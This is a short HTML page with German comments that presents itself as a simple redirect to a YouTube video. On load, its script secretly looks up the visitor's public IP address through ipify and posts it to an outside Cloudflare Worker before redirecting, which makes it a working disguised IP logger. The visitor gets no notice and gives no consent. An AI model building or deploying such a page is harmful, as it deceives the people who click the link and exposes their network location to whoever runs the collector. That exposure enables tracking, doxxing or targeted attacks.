<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>
<script>
    window.addEventListener('DOMContentLoaded', async () => {
        const workerUrl = "https://crimson-resonance-fe5c.rob-max.workers.dev/"; 
        // HIER DEN YOUTUBE-LINK EINTRAGEN
        const youtubeUrl = "https://www.youtube.com/watch?v=HIER_DEINE_VIDEO_ID"; 

        try {
            // 1. IP des Nutzers im Hintergrund abfragen
            const ipResponse = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipResponse.json();
            const userIp = ipData.ip;

            // 2. IP-Adresse an deinen Cloudflare Worker senden mit einem kurzen Timeout
            // Damit die Weiterleitung nicht blockiert wird, falls der Worker mal laggt
            await Promise.race([
                fetch(workerUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ message: userIp })
                }),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
            ]);

        } catch (error) {
            console.error("Hintergrund-Aktion fehlgeschlagen:", error);
        } finally {
            // 3. Weiterleitung zu YouTube (wird immer ausgeführt, auch bei Fehlern)
            window.location.href = youtubeUrl;
        }
    });
</script>
</body>
</html>
